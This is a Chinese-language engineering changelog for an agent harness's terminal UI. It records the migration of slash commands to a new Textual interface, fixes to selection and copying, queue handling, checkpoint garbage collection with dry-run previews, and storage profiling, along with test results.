`ruff check .` 通过。**刻意未做**：对 `exec_policy` / `documents` / `hooks` 整体
`ruff format` —— 保持移动代码逐字不变，且符合 `ruff.toml` 的增量格式化约定；
新文件按需在后续改动中逐步收敛。
## P6：textual 默认切到新 TUI

`HARNESS_UI=textual` 过去仍加载旧 `ui_textual.py`，新 `src/ui/harness_app.py` 只能靠
`textual-next` 试验。现在路由反过来：

| 值 | 实现 |
|---|---|
| `ansi`（默认） | 行式 REPL |
| `textual` | `src/ui/harness_app.py`（行模型 + 虚拟视口） |
| `textual-next` | 同上，兼容旧脚本/配置 |
| `textual-legacy` | `ui_textual.py` 旧实现，仅对照 |

`entrypoint._interactive_lock()` 对三种 Textual 模式都释放交互锁，避免 worker 与
cron 争锁；`--ui` 的 choices 同步增加 `textual-legacy`。新 app 启动/渲染失败仍会
捕获异常回退 ANSI，不会把终端留在半初始化状态。

**验证**：`tests/test_entrypoint.py` 覆盖三种模式的锁、`tests/test_cli_output.py`
确认 `textual` 进入新 app；定向 76 passed。真实终端 checklist（Windows Terminal /
PowerShell / VS Code 终端）仍待人工验收。
## TUI 迁移：/checkpoint /rewind /undo

新 TUI 之前只迁了 `/checkpoints`（只读列表），快照写操作和回滚仍要切 ANSI。现在补齐：

- `/checkpoint [label]`：调用 `CheckpointManager.begin_turn(..., trigger='manual')`
  后立即 `seal()`；忙碌时拒绝，避免在工具调用中间拍快照；
- `/rewind [ID|last|head] [--force] [--session] [--yes]`：
  1. `command_error` 先校验参数；
  2. `resolve` + `snapshot_path` 检查快照存在；
  3. `plan_restore` 只预览，不落盘；有冲突且无 `--force` 时直接拒绝；
  4. 默认弹 `ConfirmModal`（`y`/Enter 确认，`n`/Esc 取消），`--yes` 才跳过；
  5. 执行走既有 `harness.rewind_to`，保留 append-only rewind 事件、文件恢复和
     `messages[:]` 替换；随后 `_reload_transcript()` 清空块模型并按新历史重建；
- `/undo` = `/rewind last --yes`，与 ANSI 行为一致；
- `ConfirmModal` 是独立 modal，不依赖审批门；报告里的 ANSI 色码统一剥离；
- 忙碌中拒绝回滚；回滚失败（快照缺失/`ok=False`/异常）只显示通知，不改内存历史。

**测试**：`/checkpoint` 参数与 seal、`/rewind` 预览 + y 确认、n 取消保持历史、
`/undo` 参数校验；命令注册表确认四条命令 `ported=True`。定向 56 passed。

## TUI 迁移：剩余 slash 命令与 /tree 评估

新 TUI 之前仍有 `/archive` `/delete` `/find` `/workspaces` `/workspace`
`/cd` `/watch` `/revoke` `/more` 只能回 ANSI 使用。本次全部接入，注册表 39 条
命令均为 `ported=True`：

- **交互分层（对照 Pi）**：Pi 没有这些命令，但其 `ctx.ui.select` / 自定义
  selector 的做法可以复用——命令只负责准备数据，选择/确认交给通用 modal：
  - `ChoiceModal`：搜索 + 单选（`/find` 命中会话、`/workspace remove` 登记项）；
  - `CleanupPickerModal`：多选归档/恢复/删除，空格勾选、F2/Ctrl+A 全选可见项、
    Enter 确认；筛选后保留已勾选项；
  - `TypedConfirmModal`：删除必须原样输入“删除”，空回车只提示、不执行。
- **共享语义**：`session_cleanup_plan` / `apply_session_cleanup`、
  `add_workspace_from_argument` / `remove_workspace_selector` 下沉到
  `harness.py`；行式 REPL 与 TUI 共用，避免“同名命令两套行为”。
- **线程边界**：归档/删除的扫描与执行、`/find` 搜索、`/watch` 跟踪都在后台
  线程；扫描/执行期间 `redirect_stdout`，防止旧的 print 覆盖 Textual 屏幕。
- **/watch**：`watch_command` 增加 `emit` 注入，REPL 仍传 `print`，TUI 把进度
  写进同一个 notice 块（只保留最近 8 行），结束时替换为完整输出。
- **/new --ws**：支持已登记工作区的序号/名称/路径；未登记的绝对或相对目录
  仍可直接使用，和旧 REPL 一致。
- **/tree 不实现**：项目真相源是 append-only 事件流，文件回滚由
  checkpoint/rewind 负责，历史分叉由 `/fork` 负责；Pi 的消息树是另一套模型。
  两套同时存在会让“当前历史”出现两个定义。保留 `/fork` 选择器 + `/rewind`
  作为等价路径，结论写入 `docs/UI_REWRITE_PLAN.md`。

**测试**：新增 `/find` 搜索→选择→恢复、`/archive` 全选→确认→执行、
`/delete` 短语确认、`/workspaces` `/workspace remove` `/cd`、
`/new --ws`、`/watch` emit 与 TUI 状态块测试；命令迁移相关 177 passed，
全量 1188 passed / 1 skipped，`ruff check .` 通过。两条旧断言
（“仍有命令仅在行式 REPL”）随 39 条全部迁移更新为“全部已迁移”。

**刻意未做**：暂不删除 `ui_textual.py`（留一版真实终端对照，验收后再删）；
不引入 `/tree`；未对 legacy 文件做整体格式化，遵守 `ruff.toml` 的增量格式化约定。

## feature/ui 收尾审查：任务互斥、迟到结果与命令兼容

检查已提交的 P6/快照迁移及工作区内尚未提交的剩余命令迁移，修复以下问题：

- **任务期间切换上下文**：阻止 `/new`、`/resume`、`/sessions`、`/fork`、
  `/clone`、`/cd` 改变活跃任务的会话与工作区；恢复回调也再次检查忙碌状态。
  恢复工作区失败时保持原会话，切换成功后清理旧状态与文件补全缓存。
- **本地操作期间的消息丢失/并发**：shell、压缩和会话清理标记独立操作类型，
  此时普通输入进入 follow-up，不进入无人消费的 steering；操作结束或清理失败后
  继续排队请求。清理确认时再次检查后台整理状态，阻止执行期间切换活跃会话。
- **迟到选择器**：搜索/归档扫描的 notice 已随会话切换清除时，丢弃扫描结果；
  清理扫描结束时若已有请求运行，提示稍后重试，不再弹出清理选择器。
- **命令覆盖不完整**：补 `/checkpoint-gc`、`/resume last`、行式命令别名及
  `/approvals <序号> y|n`；对比两套注册表的测试防止漏项。当前为 40 条 TUI 命令。
- **交互收尾**：目录候选只回填；`/new --ws` 支持引号包围的路径；
  多选 Ctrl+A 在搜索框中也可用，筛选保留勾选；用户标题按纯文本展示；
  确认报告滚动显示，避免长预览挤掉提示；清空视图后 shell 结束仍能解除忙碌状态。
- **后台 stdout**：归档扫描通过 `emit` 注入诊断输出，清理执行不重定向全局
  stdout，避免与其他线程的输出重定向嵌套。行式 REPL 默认仍使用 print。

回归覆盖真实 checkpoint 文件恢复、外部改动冲突、强制恢复、rewind 事件重放、
清理成功/失败后队列处理、忙碌时切换拦截、过期扫描、多选筛选、长预览与目录补全。

**验证**：主套件 1200 passed / 1 skipped（主机不支持 symlink），5 条 warning
均为飞书 SDK 的 pkg_resources 弃用提示；入口/CLI/UI 集成/旧 UI/MCP 联合回归
97 passed；Ruff 与 git diff --check 通过。联合回归发现非 TTY 输出测试依赖
renderer 的导入顺序，已隔离事件渲染回调后复测通过。
10k 块布局 27.3ms、滚动 0.797ms/帧、流式更新 1.694ms。

**尚未完成**：Windows Terminal / PowerShell / VS Code 真实终端验收、P7 重复实现清理、
合并 main。检查清单已写入 UI_REWRITE_PLAN；自动测试通过不代表这些步骤完成。

## TUI 自绘视口选区修复

用户反馈 Markdown 显示后无法拖选。根因不是 Markdown 格式，而是自绘
`VirtualTranscript.render_line` 绕过了默认渲染管线：没有给 strip 添加文本 offset
元数据，也没有根据 text_selection 绘制高亮或实现 get_selection。
此前 Ctrl-C 回归 mock 了 _selected_text，不能证明鼠标选择链路有效。

修复：每个真实内容段通过 Strip.apply_offsets 标记文档行和字符偏移，沿用
Textual 对终端 cell 与 Unicode 字符的映射；选中行按字符范围叠加主题高亮，
从布局行提取纯文本，不复制 Markdown 标记或终端补齐空白。
普通行继续缓存，选中状态不写入缓存，清除选区后不会留下旧高亮。
窗口换宽后清除基于旧布局的选区，防止复制错位。

新增真实鼠标 down/move/up 回归，覆盖中文与 emoji 正反向拖选、选区高亮及清除、
滚动后的代码块跨行复制、Ctrl-C 不退出、Ctrl-Shift-C、越界与换宽。
复制出口仍用测试回调捕获，系统剪贴板通过 OSC 52 的实际写入仍待终端验收。

验证：对话/生命周期/布局/选区/UI 集成定向回归 79 passed；旧 UI/MCP 回归
67 passed；增量 Ruff 通过。
10k 块布局 25.5ms、滚动 0.685ms/帧、流式更新 1.448ms。
该基准测布局计算，不代表真实终端选区渲染或系统剪贴板性能。

## TUI 拖选即复制与行尾空白

按用户交互要求，拖选后松开鼠标即复制到剪贴板，仍保留显式复制快捷键。
复制在刷新后读取最终选区；单击和仅选中行尾空白不覆盖剪贴板。
Rich 代码面板渲染行自身带有行尾填充，先前 get_selection 把这些空白计入
复制文本，导致字符数偏大。现在逐行去除尾部空格/tab，保留行首缩进、正文
内部空格与换行，清除结尾空行；提示计数使用实际复制字符串长度。
这也会去掉源代码有意保留的行尾空格；完整工具原始输出仍可通过 /copy 获取。

验证：选区/新 TUI/生命周期/布局 78 passed；增量 Ruff 通过。
新增真实代码面板拖选测试验证自动复制、行尾清理、缩进与计数，及单击/空白
选择不覆盖剪贴板。系统剪贴板在真实终端的写入仍待人工验收。

## 复制计数口径修正

用户继续反馈计数偏大。复现居中 H1：Heading 为 7 个字母，80 列布局提取后
仍带 36 个前导空格，len 为 43；上一轮仅清理行尾，仍将布局左填充、缩进和
换行纳入提示数字。统一自动复制、Ctrl-C/Ctrl-Shift-C 与 /copy 的提示为
non-whitespace chars，使用 Unicode isspace 排除空白，复制内容保留原有结构。
这是非空白 Unicode 码点数，不是字节数或终端列数。
新增 60/100 列居中标题真实拖选回归，确保提示恒为 7，同时验证工具复制口径。
回归还暴露退出期间视口脱离 screen 后读取选区导致 NoScreen，增加挂载检查。
验证：选区/新 TUI/生命周期/布局 80 passed；增量 Ruff 通过。

## TUI 队列交互：Enter/Alt+Enter 对调与选择器管理

用户提出队列需要可选的取回与删除，并把 Enter 定义为“进入队列”、Alt+Enter
定义为“立刻入队”。据此明确交互契约：

- 忙时 Enter 进入 follow-up 队列，本回合结束后处理；Alt+Enter 进入 steering，
  Agent 下一次消费时注入当前回合。空闲时两者都直接发送，不额外排队。
- Ctrl+G、Alt+↑ 或 `/dequeue` 打开 `QueueModal`：↑↓ 选择、Enter 取回单条、
  Ctrl+R 取回全部、Delete/Ctrl+D 删除选中项（ConfirmModal 二次确认）、Esc 关闭。
  只有一条消息时 Ctrl+G 直接取回，省去一次确认。F2 与部分系统/终端快捷键冲突，
  已从队列与归档多选界面移除（后者保留 Ctrl+A）。
- 取回把消息追加到现有草稿之后并保留多行内容；删除只移除队列项，不写入历史。
- Esc 取消回合仍取回全部未消费消息，行为和之前一致。

实现上，`PendingQueue.take_at(index, expected=text)` 在锁内校验预期文本再弹出。
弹窗打开后 Agent 可能消费 steering，队列位置会前移；如果不校验，旧行可能误取
到下一条消息。`QueueModal` 只返回动作和值，App 再用打开时的行快照核对。
删除键不绑定裸字母 `d`，避免搜索框无法输入；列表获得焦点后使用 Delete/Ctrl+D。

新增 `tests/test_ui_queue.py`：Enter/Alt+Enter 分流、单条直接取回、选择器
↑↓ 单条取回、删除确认/取消、已消费行的过期保护。同时更新旧队列测试以打开
选择器后按 Ctrl+R 取回全部。

验证：队列/新 TUI/生命周期/命令/补全定向回归 95 passed；随后队列 7 passed；
完整 UI 回归 188 passed；全量 1214 passed / 1 skipped（主机不支持 symlink），
5 条 warning 均为飞书 SDK 弃用提示；增量 Ruff 通过。
真实终端中的 Ctrl+G、Delete 与 Alt+Enter 仍需按验收表检查。

## checkpoint-gc 全局回收与试运行

用户反馈 `/checkpoint-gc` 显示“无需清理”。检查后确认不是删除失败：`gc()` 只扫描
当前会话目录，且只在节点数超过 `CHECKPOINT_MAX_NODES=20` 时删除最旧的非 head、
非 label 节点；本机 `.cache/checkpoints` 实际有 21 个会话、1243 个节点，旧会话
从未被这条命令覆盖。当前会话不足 20 个节点时提示“无需清理”是正确的，但缺少
“其他会话还有多少”的上下文。

实现调整：

- `CheckpointManager.gc_plan()` 只计算计划并给出节点体积，`gc()` 复用计划删除；
  `gc(max_nodes=N)` 允许命令层覆盖保留上限，不改变 manager 的长期配置。
- `checkpoints.gc_all_checkpoints(dry_run=True)` 遍历每个会话目录，按同样的
  head/label 规则试运行，返回会话数、节点数、待删数量、释放字节和明细；
  `dry_run=False` 才真正删除。`checkpoint_counts()` 用于报告其他会话存量。
- `/checkpoint-gc` 默认只处理当前会话，并提示其他会话待清理量；
  `/checkpoint-gc --all` 先展示预览，TUI 弹 `ConfirmModal`、行式 REPL 用 `_confirm`，
  确认后才执行；`--keep N` 覆盖每会话保留上限。命令参数校验同步到
  `cli_commands` 与 TUI 命令元数据。
- 不做隐式自动清理；删除旧 checkpoint 会切断旧回溯链，必须由用户确认。

本机只读 dry-run：21 个会话、1243 个节点，按每会话保留 20 个可回收 931 个
（约 92.99MB），其中 12 个会话有可回收项，耗时约 1 秒。没有执行删除。

新增测试：`gc_plan` 不改盘、全局 dry-run/执行、跨会话按保留上限、label 保留、
`--keep` 解析与错误、TUI `--all` 取消/确认/校验、格式化中的其他会话提示。
验证：checkpoint/TUI/生命周期/命令/补全定向 134 passed；随后 checkpoint 45 passed
（含行式 REPL 的 --all 取消/确认）；全量 1220 passed / 1 skipped，5 条 warning
均为飞书 SDK 弃用提示；增量 Ruff 通过。

补充：`--keep` 只影响当次命令，清理不会自动执行，也不改变默认保留策略。
参数补全改为上下文感知：`--all ` 继续提示 `--keep 10/20/50/100`，`--keep `
提示数字并保留前面的参数；同时补 `/cache gc <天数> ` 的 `--apply` 和
`/watch <id> --timeout ` 的 30/60/300。新增复合参数补全测试，全量 1223 passed。

## Agent 存储/内存 profile 与清理边界调研

**问题**：`.cache` 同时放会话、快照、工具大输出、transcript、记忆、任务、API 日志和
未知目录；已有 `/cache gc`、`/checkpoint-gc`、`/archive`、`/delete` 四条清理路径，
但没有一个总览能回答“哪里占空间、哪些真的可删、哪些不能动”。直接做全量自动 GC
又会把恢复源和派生缓存混在一起。

**调研**：

- Pi（本机 v1.3.0）：session 是 append-only JSONL；恢复选择器只扫描 header；
  `Ctrl+D` 删除优先调用 `trash`，失败才 `unlink`；compaction 追加摘要并保留原始
  entries；图片默认按约 2000×2000 / 4.5 MiB 编码上限缩放；prompt cache warming
  是供应商缓存策略，不是磁盘 GC；没有启动时自动删旧会话。
- Codex CLI（本机 0.162.1）：活动 `sessions/` 与 `archived_sessions/` 分开；提供
  显式 `codex archive/unarchive/delete`；rollout 可为 `.jsonl.zst`，历史可迁移为
  分页 SQLite thread history；SQLite 使用 WAL/`auto_vacuum=INCREMENTAL`；
  `codex doctor` 报告 rollout 文件数/字节、DB 完整性和一致性，但不自动删除。
- 两者共同点：**历史保留与派生缓存分离，删除显式化，先诊断后操作**。

**做法**：

- 新增 `src/storage_profile.py`：把 `.cache` 分为源数据（sessions/memories/tasks/
  os_tasks/导出）、派生缓存（tool_results/checkpoints）、临时/诊断目录和未识别目录；
  统计文件数/字节/最早时间，工具缓存调用 `tool_cache.plan_cleanup` 计算引用保护后的
  可回收量，快照调用 `gc_all_checkpoints(dry_run=True)` 计算按会话保留策略的可回收量。
- `/cache profile` 输出完整 profile；`/cache gc` 保持原有“工具缓存按天 + 引用保护”的
  预览/执行语义；`/checkpoint-gc` 保持按会话保留策略；会话仍只通过 `/archive`、
  `/delete` 处理。未识别目录只报告，不自动删除。
- `--doctor` 增加 storage 摘要（浅扫描，不计算引用/快照计划）。
- `scripts/profile_storage.py` 支持 `--json` 和 `--session largest`：用 `tracemalloc`
  测量读取事件、重建 OpenAI 历史的当前/峰值内存。
- 内存缓存加界：session summary 512、project instructions 256、Markdown Console 16 个宽度；
  TUI 行缓存和审批缓存沿用已有上限。

**本机只读 profile**：`.cache` 约 75 MB；可识别 29.0 MB（sessions 9.0 MB / 46 文件、
checkpoints 17.2 MB / 177 节点、transcripts 1.8 MB 等），未识别 42.4 MB
（`dsh-im-reference`，只报告）。最大 session 约 4.9 MB：读取约 88 ms、重建历史约 152 ms，
当前约 11.7 MB、峰值约 22.9 MB。此前 `--keep 10` 使 21 个会话各保留 10 个节点；
默认仍是每会话 20，故当前快照可回收量为 0。

**暂不做**：不自动删除会话/记忆/导出/未知目录；不在启动时全量 GC；不按目录年龄删除
无引用证据的数据；暂不引入 rollout zstd 压缩或分页存储，先用真实 profile 决定是否需要。

验证：storage/TUI/命令/tool_cache 定向 82 passed；全量 1228 passed / 1 skipped，
5 条 warning 均为飞书 SDK 弃用提示；`harness.py --doctor` 已输出 storage 摘要；
Ruff 与 diff 检查通过。
